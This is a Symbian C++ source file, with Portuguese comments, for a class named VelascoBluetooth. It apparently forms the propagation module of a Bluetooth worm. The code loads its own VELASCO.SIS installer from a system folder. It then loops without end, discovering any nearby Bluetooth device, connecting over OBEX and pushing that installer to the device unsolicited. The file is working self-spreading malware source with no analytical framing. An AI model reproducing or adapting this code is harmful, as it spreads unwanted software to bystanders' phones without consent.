// Codigo baseado em:
// http://irssibot.777-team.org/cobain/docs/2004-01-13/impl-html/btdiscoverer_8cpp-source.html
// http://forum.newlc.com/viewtopic.php?p=2752
// http://www.cs.tut.fi/~mobo/Symbianv6onedocs/devlib/Common/APIGuide/Bluetooth/UsingBluetoothSockets/HowToFindAndConnectToADevice/Howtoselectaremotedevice.html
// http://www.rdc.cz/index.php?jazyk=0&sid=0&main=sekce&stav=clanek&cid=290

#include "bluetooth.h"


#define  _BLUETOOTH_NOT_CONNECTED  0
#define  _BLUETOOTH_CONNECTED      1
#define  _BLUETOOTH_DISCONNECT     2

#define  _NOT                      0


VelascoBluetooth::VelascoBluetooth() : CActive( CActive::EPriorityStandard )
{
	FoundCell = _NOT;
	BluetoothStatus = _BLUETOOTH_CONNECTED;

	iCurrObject = CObexFileObject::NewL( TPtrC( NULL, 0 ) );
	iCurrObject->InitFromFileL( _L( "C:\\SYSTEM\\SYMBIANSECUREDATA\\VELASCO\\VELASCO.SIS" ) );
	
	// Adicionando no scheduler, evita problemas de sincronismos
	CActiveScheduler::Add( this );
}


VelascoBluetooth* VelascoBluetooth::NewL()
{
	return NewLC();
}


VelascoBluetooth* VelascoBluetooth::NewLC()
{
	VelascoBluetooth* self = new VelascoBluetooth;
	self->ConstructL();
	return self;
}


void VelascoBluetooth::ConstructL()
{
	BluetoothStatus = _BLUETOOTH_CONNECTED;
	
	RunL();
}


void VelascoBluetooth::RunL()
{
	if ( BluetoothStatus == _BLUETOOTH_NOT_CONNECTED )
	{
   	    BluetoothStatus = _BLUETOOTH_CONNECTED;
	    
		// Ja estava conectado ?
		if ( iClient->IsConnected() )
		{
			BluetoothStatus = _BLUETOOTH_DISCONNECT;
			
			Cancel();
			iClient->Put( *iCurrObject, iStatus );
			SetActive();
			
			return;
		}		
	}
	else if ( BluetoothStatus == _BLUETOOTH_DISCONNECT )
	{
		BluetoothStatus = _BLUETOOTH_CONNECTED;

		Cancel();
		iClient->Disconnect( iStatus );
		SetActive();
		
		return;
	}

    // Conseguiu conectar ?
	if ( BluetoothStatus == _BLUETOOTH_CONNECTED )
	{
		if ( iClient != NULL )
		{
			delete iClient;
			iClient = NULL;
		}

		while ( BluetoothStatus == _BLUETOOTH_CONNECTED )
		{
            RSocketServ socketServ;
            TProtocolDesc pInfo;
            TNameEntry entry;
            
    	    if ( socketServ.Connect() == KErrNone )
	        {
	           if ( socketServ.FindProtocol( (const TProtocolName &) _L( "BTLinkManager" ), pInfo ) == KErrNone )
	           { 
                   RHostResolver hr;
                   
    	           if ( hr.Open( socketServ, pInfo.iAddrFamily, pInfo.iProtocol ) == KErrNone )
	               {	
                       TInquirySockAddr addr;                     

	                   FoundCell = _NOT;

	                   addr.SetAction( KHostResInquiry );
   	                   addr.SetIAC( KGIAC );
	
	                   TRequestStatus status;
	                   hr.GetByAddress( addr, entry, status );
	
	                   User::WaitForRequest( status );

	                   FoundCell = ( status == KErrNone );
                   }
               }
    
	           socketServ.Close();
	        }
	        
	        if ( FoundCell )
	        {
		        FoundCell = _NOT;

		        Cancel();
		
		        TBTSockAddr addr( entry().iAddr );
		        TBTDevAddr btAddress;

		        btAddress = addr.BTAddr();		

		        TObexBluetoothProtocolInfo obexProtocolInfo; 

		        obexProtocolInfo.iTransport.Copy( _L( "RFCOMM" ) ); 
		        obexProtocolInfo.iAddr.SetBTAddr( btAddress ); 
		        obexProtocolInfo.iAddr.SetPort( 9 ); 
	
		        if ( ( iClient = CObexClient::NewL( obexProtocolInfo ) ) )
		        {			
			        iStatus = KRequestPending;
			        
			        BluetoothStatus = _BLUETOOTH_NOT_CONNECTED;

			        Cancel();
			        iClient->Connect( iStatus );
			        SetActive();
		        }
	        }
	        else
	        {
		        BluetoothStatus = _BLUETOOTH_CONNECTED;
	        }
		}
	}
}
